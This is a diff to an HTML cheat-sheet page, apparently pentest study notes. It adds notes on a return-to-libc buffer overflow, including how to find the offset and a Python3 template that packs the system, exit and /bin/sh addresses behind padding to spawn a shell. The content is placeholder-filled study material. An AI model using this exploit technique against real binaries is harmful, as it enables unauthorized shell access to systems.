@@ -156,11 +156,14 @@ layout: default
                                         <td>
                                             <li>$(python -c &apos;print(&quot;a&quot;*&lt;offset&gt; + &quot;<span class="red">&lt;System&gt;</span>&quot; + &quot;<span class="teal">&lt;Exit&gt;</span>&quot; + &quot;<span class="brown">&lt;/bin/sh&gt;</span>&quot;)&apos;)</li>
                                             <ul>
+                                                <li>Find offset by sending pattern to trigger BOF and find where in the pattern the pointer instruction lands</li>
                                                 <li>Addresses must be little-endian encoded</li>
                                                 <ul>
                                                     <li>0xb7e53da0 = \xa0\x3d\xe5\xb7</li>
                                                 </ul>
                                             </ul>
+                                            <li>Python3 script to assemble BOF command/input</li>
+                                            <pre>#! /usr/bin/env python3&#13;&#10;&#13;&#10;import struct&#13;&#10;import sys&#13;&#10;&#13;&#10;&#13;&#10;libc_base = &lt;one of the addresses from the libc range&gt;&#13;&#10;system = struct.pack(&quot;&lt;I&quot;, libc_base + 0x&lt;system@@ address&gt;)&#13;&#10;exit = struct.pack(&quot;&lt;I&quot;, libc_base + 0x&lt;exit@@ address&gt;)&#13;&#10;binsh = struct.pack(&quot;&lt;I&quot;, libc_base + 0x&lt;/bin/sh address&gt;)&#13;&#10;&#13;&#10;path = b&quot;A&quot; * &lt;msf-patten_offset&gt; + system + exit +binsh&#13;&#10;sys.stdout.buffer.write(path)&#13;&#10;</pre>
                                         </td>
                                     </tr>
                                 </table>
@@ -178,6 +181,7 @@ layout: default
                 </table>
             </td>
         </tr>
+        <tr></tr>
     </table>
     
     
